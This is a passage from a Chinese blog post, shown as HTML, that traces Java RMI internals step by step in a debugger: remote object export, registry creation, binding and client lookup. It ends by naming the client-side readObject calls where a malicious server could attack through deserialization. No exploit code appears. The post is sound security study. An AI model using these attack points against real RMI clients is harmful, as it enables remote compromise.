class="token keyword">public</span> String <span class="token function">sayHello</span><span class="token punctuation">(</span>String keywords<span class="token punctuation">)</span> <span class="token punctuation">{</span>        String upKeywords <span class="token operator">=</span> keywords<span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>upKeywords<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">"copy that"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>这个就是被调用的远程方法的具体实现，要执行的代码逻辑全写在这里了，代码比较简单就不赘述了。<br>最后再添加一个服务端的IRemoteObj：</p><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>example<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>Remote<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>RemoteException<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">IRemoteObj</span> <span class="token keyword">extends</span> <span class="token class-name">Remote</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> String <span class="token function">sayHello</span><span class="token punctuation">(</span>String keywords<span class="token punctuation">)</span> <span class="token keyword">throws</span> RemoteException<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>接着来编写客户端：</p><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>example<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>NotBoundException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>RemoteException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span>LocateRegistry<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span>Registry<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RMIClient</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> RemoteException<span class="token punctuation">,</span> NotBoundException <span class="token punctuation">{</span>        Registry registry <span class="token operator">=</span> LocateRegistry<span class="token punctuation">.</span><span class="token function">getRegistry</span><span class="token punctuation">(</span><span class="token string">"127.0.0.1"</span><span class="token punctuation">,</span> <span class="token number">1099</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        IRemoteObj remoteObj <span class="token operator">=</span> <span class="token punctuation">(</span>IRemoteObj<span class="token punctuation">)</span> registry<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span><span class="token string">"remoteObj"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        String hello <span class="token operator">=</span> remoteObj<span class="token punctuation">.</span><span class="token function">sayHello</span><span class="token punctuation">(</span><span class="token string">"hello"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>hello<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>客户端还需编写一个接口IRemoteObj,用于说明客户端需要调用何种方法：</p><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>example<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>Remote<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>RemoteException<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">IRemoteObj</span> <span class="token keyword">extends</span> <span class="token class-name">Remote</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> String <span class="token function">sayHello</span><span class="token punctuation">(</span>String keywords<span class="token punctuation">)</span> <span class="token keyword">throws</span> RemoteException<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>实验结果：<br>服务端：<br><img src="/Blogimages/RMI/1.png"><br>客户端：<br><img src="/Blogimages/RMI/2.png"></p><p>完成了这个简单小实验后对RMI的理解应该深了一点，我们现在来更完整地理解RMI的流程<br>首先有服务端和客户端，客户端如何调用服务端呢？服务端通过绑定远程对象，这个对象可以封装网络操作，<code>网络之间的通信就是端口之间的通信</code>，客户端只要传递需要调用的方法的名字即可。可是客户端和服务端之间的沟通端口怎么确定呢，Java为了解决这个问题，弄了一个叫做注册中心的东西，并且<code>固定端口为1099</code>。因此只要任何想要和服务端通信的机子只要来1099端口询问要调用的服务开在哪个端口即可，同理在服务端开设服务也要到注册中心注册并且会使用动态分配端口的方法来开设服务。<br>需要注意的是端口之间通信的话接口也要相同(java.rmi.Remote)，同时接口也要抛出异常，这样才能通信。</p><h3 id="最后说几个坑点："><a href="#最后说几个坑点：" class="headerlink" title="最后说几个坑点："></a>最后说几个坑点：</h3><pre class=" language-xml"><code class="language-xml">1.最好把这个RMIClient和RMIServer分开，不然很容易写岔。2.分开写之后两边的包名都要相同，否则反序列化，然后报错3.服务端new一个RemoteObjImpl的时候是用RemoteObj这个接口去声明的</code></pre><h2 id="RMI流程分析"><a href="#RMI流程分析" class="headerlink" title="RMI流程分析"></a>RMI流程分析</h2><h3 id="RMI创建远程服务"><a href="#RMI创建远程服务" class="headerlink" title="RMI创建远程服务"></a>RMI创建远程服务</h3><p><a href="https://xz.aliyun.com/t/9261">https://xz.aliyun.com/t/9261</a>这个链接偷了一张图<br><img src="/Blogimages/RMI/3.png"><br>服务端有注册中心，是一个hash表，用来存储名字和远程对象。<br>客户端是连接注册中心，获取名字来调用远程对象。<br>客户端和服务端并不是直接进行交互的，而是利用了代理。服务端的代理叫做Skeleton，客户端的代理叫做Stub<br>用代理的目的是为了把不属于业务的东西提取出来。<br>产生漏洞的地方肯定是在交互过程中发生的，但是出问题的是在哪部分呢？从图中可以看到有六部分，为了寻找问题到底是出在哪部分，我们从服务端的创建开始逐个分析。<br>我们从下面这段代码开始调试</p><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>example<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>AlreadyBoundException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>RemoteException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span>LocateRegistry<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span>Registry<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RMIServer</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> RemoteException<span class="token punctuation">,</span> AlreadyBoundException <span class="token punctuation">{</span>        IRemoteObj remoteObj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RemoteObjImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>开始分析创建远程对象的这个流程，因为这个流程是把服务发布到网上，我们一步一步来看它是如何发布的。<br>在图示地方下断点：<br><img src="/Blogimages/RMI/4.png"><br>下一步走到构造函数：<br><img src="/Blogimages/RMI/5.png"><br>如何再下一步走到UnicastRemoteObject的构造函数：<br><img src="/Blogimages/RMI/6.png"><br>同时注意到此时的port是0，这里的0就是代表随机值。因为这里是把服务发布到网络上（如果对端口有疑惑为什么不是1099的要注意区分注册中心和服务端口的区别），所以不可能每种服务固定一个端口，这样子一旦服务过多端口会不够用的。<br>下一步我们跟到调用exportObject这个地方：<br><img src="/Blogimages/RMI/7.png"><br>根据英文意思这里就是发布对象的感觉，这是一个静态函数，而且也是关键语句。因此我们在RemoteObjImpl这个类中也可以不继承UnicastRemoteObject这个类，直接在构造函数中调用这个静态方法也可以。<br>这个obj是我们要实现的真正逻辑，后面的new UnicastServerRef是用于处理网络请求的，可以注意到这里只传了port进去，因此ip是他可以自动获取到的。<br>下一步：<br><img src="/Blogimages/RMI/8.png"><br>可以看见新建了一个类LiveRef，我们跟进<br><img src="/Blogimages/RMI/9.png"><br>传进去的是一个ID和一个port，ID就是理解成给个编号吧，port就是之前的默认0端口<br>然后我们ID就不看了，直接跟进他的构造函数：<br><img src="/Blogimages/RMI/10.png"><br>然后可以看到<br>第一个参数是ID<br>第二个参数是TCPEndpointD的一个静态函数<br>第三个参数true</p><p>我们这里只看第二个参数<br><img src="/Blogimages/RMI/11.png"><br>可以看到他的里面是返回类型为TCPEndpoint的一个东西，再看一下TCPEndpoint的构造函数：<br><img src="/Blogimages/RMI/12.png"><br>发现这里他要接受两个参数，host和port。可以感受到这个东西就是一个处理网络请求的东西</p><p>我们再看一下LiveRef的构造函数：<br><img src="/Blogimages/RMI/13.png"><br>接收三个参数，ID，Endpoint，isLocal<br>其他都好理解，主要就是这个Endpoint是什么，我们看一下它里面有什么东西：<br><img src="/Blogimages/RMI/14.png"><br>发现这里host已经被获取了<br>但是port还是0，port如何获取我们后面在分析</p><p>LiveRef的创建到这里就完成了，我们需要记住LiveRef的ID，并且我们从头到尾只创建了这一个LiveRef<br>再往下走，这里也只进行了赋值：<br><img src="/Blogimages/RMI/15.png"></p><p>继续往下走：<br><img src="/Blogimages/RMI/16.png"><br>这里的UnicastServRef就是刚才赋值的的那个东西，只不过包装了而已，而且这也进行了赋值<br>然后继续往下走到sref.exportObject，继续对sref“exportObject”<br><img src="/Blogimages/RMI/17.png"><br>但是我们发现这里创建了代理stub</p><h4 id="stub明明是客户端的代理，为什么要在服务端创建"><a href="#stub明明是客户端的代理，为什么要在服务端创建" class="headerlink" title="stub明明是客户端的代理，为什么要在服务端创建"></a>stub明明是客户端的代理，为什么要在服务端创建</h4><p>因为需要现在服务端创建完这个代理放在注册中心，客户端再到注册中心去使用这个stub进行操作</p><p>我们往下看一下这个stub是怎么创建的<br>第一步是创建一个远程对象类：</p><pre class=" language-java"><code class="language-java">Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> remoteClass<span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            remoteClass <span class="token operator">=</span> <span class="token function">getRemoteClass</span><span class="token punctuation">(</span>implClass<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">ClassNotFoundException</span> ex <span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">StubNotFoundException</span><span class="token punctuation">(</span>                <span class="token string">"object does not implement a remote interface: "</span> <span class="token operator">+</span>                implClass<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span></code></pre><p>第二步是判断：</p><pre class=" language-java"><code class="language-java">forceStubUse <span class="token operator">||</span><span class="token operator">!</span><span class="token punctuation">(</span>ignoreStubClasses <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">stubClassExists</span><span class="token punctuation">(</span>remoteClass<span class="token punctuation">)</span><span class="token punctuation">)</span>forceStubUse 表示当不存在时是否抛出异常是否存在以 _Stub 结尾的类。remoteClass <span class="token operator">+</span> <span class="token string">"_Stub"</span> </code></pre><p>stubClassExists的具体逻辑是这样的：</p><pre class=" language-java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">stubClassExists</span><span class="token punctuation">(</span>Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> remoteClass<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>withoutStubs<span class="token punctuation">.</span><span class="token function">containsKey</span><span class="token punctuation">(</span>remoteClass<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">try</span> <span class="token punctuation">{</span>                Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>remoteClass<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"_Stub"</span><span class="token punctuation">,</span>                              <span class="token boolean">false</span><span class="token punctuation">,</span>                              remoteClass<span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">ClassNotFoundException</span> cnfe<span class="token punctuation">)</span> <span class="token punctuation">{</span>                withoutStubs<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>remoteClass<span class="token punctuation">,</span> null<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>第三步就是创建动态代理了：</p><pre class=" language-java"><code class="language-java"><span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> AccessController<span class="token punctuation">.</span><span class="token function">doPrivileged</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">PrivilegedAction</span><span class="token operator">&lt;</span>Remote<span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">public</span> Remote <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">return</span> <span class="token punctuation">(</span>Remote<span class="token punctuation">)</span> Proxy<span class="token punctuation">.</span><span class="token function">newProxyInstance</span><span class="token punctuation">(</span>loader<span class="token punctuation">,</span>                                                           interfaces<span class="token punctuation">,</span>                                                           handler<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IllegalArgumentException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">StubNotFoundException</span><span class="token punctuation">(</span><span class="token string">"unable to create proxy"</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span></code></pre><p>创建完stub，就是收尾工作，这里创建了一个Target<br><img src="/Blogimages/RMI/18.png"><br>把我们之前创建的所有东西全都放在这里<br>创建完Target就进行ref.exportObject(target)<br>就是对这个target进行发布<br><img src="/Blogimages/RMI/19.png"><br>我们可以看见这个ep里面有TCPTransport，所以当我们执行transport.exportObject(target)的时候会对TCPTransport进行exportObject：<br><img src="/Blogimages/RMI/20.png"><br>我们跟进到listen里面：<br><img src="/Blogimages/RMI/21.png"><br>可以发现这里创建了一个Socket等待别人连接，并且使用了t.start()创建一个新的线程。<br>此时已经成功把服务发布到网络上面了，但是客户端并不知道，注册中心也不知道，所以他自己需要先记录一下这个发布的服务<br>在ObjectTable中执行了这么两行代码：</p><pre class=" language-java"><code class="language-java">objTable<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>oe<span class="token punctuation">,</span> target<span class="token punctuation">)</span><span class="token punctuation">;</span>implTable<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>weakImpl<span class="token punctuation">,</span> target<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>发现这里是用Map来记录的，并且把刚才创建的target当作值。同时这里还是一个静态表</p><p>上面的流程我们分析了服务端创建远程服务，接下来我们来看如何创建注册中心、创建的服务如何和注册中心绑定</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>注册中心的创建和远程服务的发布其实是没有关系的，他们之间并不在乎谁先谁后。因为<strong>发布远程服务和注册中心的创建他们本质上都是一样的</strong>，都是把某个服务发布到某个端口上，只不过注册中心通常是固定在1099端口，而服务则是随机发布到某一个端口上。<br>注册中心的创建和发布远程对象本质是一样的我们在下面的代码分析中也会提到。<br>所以这段代码：</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">//方式一</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RMIServer</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> RemoteException<span class="token punctuation">,</span> AlreadyBoundException <span class="token punctuation">{</span>        Registry registry<span class="token operator">=</span> LocateRegistry<span class="token punctuation">.</span><span class="token function">createRegistry</span><span class="token punctuation">(</span><span class="token number">1099</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        IRemoteObj remoteObj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RemoteObjImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        registry<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"remoteObj"</span><span class="token punctuation">,</span> remoteObj<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//方式二</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RMIServer</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> RemoteException<span class="token punctuation">,</span> AlreadyBoundException <span class="token punctuation">{</span>        IRemoteObj remoteObj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RemoteObjImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Registry registry<span class="token operator">=</span> LocateRegistry<span class="token punctuation">.</span><span class="token function">createRegistry</span><span class="token punctuation">(</span><span class="token number">1099</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        registry<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"remoteObj"</span><span class="token punctuation">,</span> remoteObj<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>这两种代码怎么写都不影响结果，但是我们为了逻辑更合理通常都是利用方式二来写。</p><h2 id="创建注册中心："><a href="#创建注册中心：" class="headerlink" title="创建注册中心："></a>创建注册中心：</h2><p>在 <strong>Registry registry&#x3D; LocateRegistry.createRegistry(1099);</strong> 处下断点，我们开始调试代码。<br><img src="/Blogimages/RMI/22.png"><br>首先是进入了静态方法createRegisty，并且传入了port1099.<br>然后这里new了一个RegistryImpl，我们就顺势走到RegistryImpl的构造方法：<br><img src="/Blogimages/RMI/23.png"><br>重点看下面的new一个LiveRef，然后又new了一个UnicastServRef，并且把LiveRef放在里面，之后调用了setup。<br>看到这里可能有点懵逼，我们上面不是提到创建注册中心和发布远程服务本质上是相同的嘛，我们可以回顾一下发布远程服务的流程：<br><img src="/Blogimages/RMI/24.png"><br>那我们在来看看创建注册中心的流程，前三步是不是都和发布远程对象一样的步骤，就是第四步执行了exportObject目前还没有体现，我们跟进到setup函数里面：<br><img src="/Blogimages/RMI/25.png"><br>其实也是调用了<strong>UnicastServerRef.exportObject</strong>了。这样看来，其实发布远程对象和创建注册中心本质上就是一样的了，他们都执行了一样的步骤。<br>唯一的区别就是调用时第三个参数permanent不一样，其实就是代表一个是永久，而另一个是非永久罢了。</p><p>接下来我们继续跟进到exportObject函数里面：<br><img src="/Blogimages/RMI/26.png"><br>到目前为止和我们之前调试发布远程对象都一样，但是我们跟进到createProxy里面就开始有区别了<br><img src="/Blogimages/RMI/27.png"><br>因为这里会执行一个stubClassExists，这个函数的代码逻辑如下：</p><pre class=" language-java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">stubClassExists</span><span class="token punctuation">(</span>Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> remoteClass<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>withoutStubs<span class="token punctuation">.</span><span class="token function">containsKey</span><span class="token punctuation">(</span>remoteClass<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">try</span> <span class="token punctuation">{</span>                Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>remoteClass<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"_Stub"</span><span class="token punctuation">,</span>                              <span class="token boolean">false</span><span class="token punctuation">,</span>                              remoteClass<span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">ClassNotFoundException</span> cnfe<span class="token punctuation">)</span> <span class="token punctuation">{</span>                withoutStubs<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>remoteClass<span class="token punctuation">,</span> null<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token comment" spellcheck="true">//功能就是判断JDK中是否有以xxx_Stub的类，有的话就加载</span></code></pre><p><img src="/Blogimages/RMI/28.png"><br>于是就会进入这个类中把他加载出来，具体的加载逻辑是这样的：</p><pre class=" language-java"><code class="language-java"><span class="token keyword">try</span> <span class="token punctuation">{</span>    Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> stubcl <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>stubname<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> remoteClass<span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    Constructor<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> cons <span class="token operator">=</span> stubcl<span class="token punctuation">.</span><span class="token function">getConstructor</span><span class="token punctuation">(</span>stubConsParamTypes<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>RemoteStub<span class="token punctuation">)</span> cons<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span> ref <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> </code></pre><p>这里利用反射forName获取类名，然后利用构造器进行实例化加载这个类</p><pre class=" language-xml"><code class="language-xml">这里和服务端的区别就是：服务端是利用动态代理创建出来的，而注册中心是利用JDK自由的类反射创建出来的</code></pre><p>接着往下走<br><img src="/Blogimages/RMI/29.png"></p><pre class=" language-java"><code class="language-java"><span class="token keyword">if</span> <span class="token punctuation">(</span>stub <span class="token keyword">instanceof</span> <span class="token class-name">RemoteStub</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//这一步就是判断stub是否是服务端定义好的</span><span class="token punctuation">{</span>     <span class="token function">setSkeleton</span><span class="token punctuation">(</span>impl<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>因为这里的stub确实是服务端已经定义好的，于是我们跟进到setSkeleton里面：<br><img src="/Blogimages/RMI/30.png"><br>再跟到createSkeleton<br><img src="/Blogimages/RMI/31.png"><br>发现这里和上面创建stub一样也是直接利用反射获取JDK的类名来实例化这个类<br>出来之后就是创建target，然后发布到网络上，和发布远程对象一样的。<br>就是这里tartget里面有三个值得注意的东西，就是objTable里面<br>第一个：RegistryImpl<br><img src="/Blogimages/RMI/32.png"><br>第二个：DGC（分布式垃圾回收）<br><img src="/Blogimages/RMI/33.png"><br>第三个：远程服务<br>可以注意到远程服务的stub类型是动态代理创建的类型为**$Proxy0**<br><img src="/Blogimages/RMI/34.png"></p><h2 id="注册绑定"><a href="#注册绑定" class="headerlink" title="注册绑定"></a>注册绑定</h2><p>我们直接下bind的断点跟进：<br><img src="/Blogimages/RMI/35.png"><br>这个checkAccess就是判断是否本地绑定<br><img src="/Blogimages/RMI/36.png"><br>然后上面那个判断就是判断这个name是否绑定过，没绑定过就put呗<br>这个bingdings本质上就是一个HashTable，然后把远程对象绑定进去，就是这么简单</p><p>服务端的分析到这里告一段落，接下来我们分析客户端</p><h2 id="客户端请求注册中心"><a href="#客户端请求注册中心" class="headerlink" title="客户端请求注册中心"></a>客户端请求注册中心</h2><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>example<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>NotBoundException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>RemoteException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span>LocateRegistry<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span>Registry<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RMIClient</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> RemoteException<span class="token punctuation">,</span> NotBoundException <span class="token punctuation">{</span>        Registry registry <span class="token operator">=</span> LocateRegistry<span class="token punctuation">.</span><span class="token function">getRegistry</span><span class="token punctuation">(</span><span class="token string">"127.0.0.1"</span><span class="token punctuation">,</span> <span class="token number">1099</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        IRemoteObj remoteObj <span class="token operator">=</span> <span class="token punctuation">(</span>IRemoteObj<span class="token punctuation">)</span> registry<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span><span class="token string">"remoteObj"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        String hello <span class="token operator">=</span> remoteObj<span class="token punctuation">.</span><span class="token function">sayHello</span><span class="token punctuation">(</span><span class="token string">"hello"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>hello<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>我们在第十行下断点，我们可以发现他的流程和服务端的一样：<br><img src="/Blogimages/RMI/37.png"><br>都是重新createProxy，然后利用forName来加载类<br>执行完后我们可以看到：<br><img src="/Blogimages/RMI/38.png"><br>这里就是获取注册中心的stub对象，下一步就是通过名字来获取远程对象<br>我们往下看lookup<br><img src="/Blogimages/RMI/39.png"><br>下面那个newCall就是创建一个连接<br>然后有一个writeObject(var1),这个var1就是我们传进来的字符串。我们发现了他被序列化了，到时候注册中心就会反序列化读取他</p><p>再往下就是重点invoke方法<br><img src="/Blogimages/RMI/40.png"><br><code>invoke</code>方法会调用<code>executeCall()</code>方法<br><code>executeCall()</code>方法中的捕获异常中有一个readObject：<br><img src="/Blogimages/RMI/41.png"><br>在这里如果服务端是一个恶意的类被服务端加载的话，就可以达到攻击客户端的目的</p><p>执行完invoke下面还有一个攻击客户端的利用点：<br><img src="/Blogimages/RMI/42.png"><br>因为这里客户端获取服务端的远程对象的过程是通过反序列化读取他的，那么如果服务端是恶意的反序列反参数就可以攻击客户端</p><p>但是这两个反序列的攻击点还是invoke进去的executeCall()这里更加隐蔽，更加常用到。因为很多函数都会调用invoke方法。如bind()，list()<br><img src="/Blogimages/RMI/43.png"><br><img src="/Blogimages/RMI/44.png"></p><h2 id="客户端请求服务端"><a href="#客户端请求服务端" class="headerlink" 